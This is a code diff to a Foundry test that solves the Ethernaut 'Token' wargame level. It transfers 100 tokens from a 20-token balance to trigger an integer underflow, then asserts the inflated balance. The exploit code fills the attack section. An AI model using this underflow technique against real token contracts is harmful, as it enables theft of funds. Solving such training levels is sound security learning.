@@ -27,11 +27,15 @@ contract TokenTest is DSTest {
         vm.startPrank(eoaAddress);
         address levelAddress = ethernaut.createLevelInstance(tokenFactory);
         Token ethernautToken = Token(payable(levelAddress));
-        vm.stopPrank();
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        bool success = ethernautToken.transfer(address(0x67), 100);
+        assertTrue(success, "Transfer failed");
+
+        // Given 20 tokens initially.  need to adjust the assertion accordingly
+        assertEq(ethernautToken.balanceOf(eoaAddress), (type(uint256).max - 79), "Wrong balance");
 
         //////////////////////
         // LEVEL SUBMISSION //
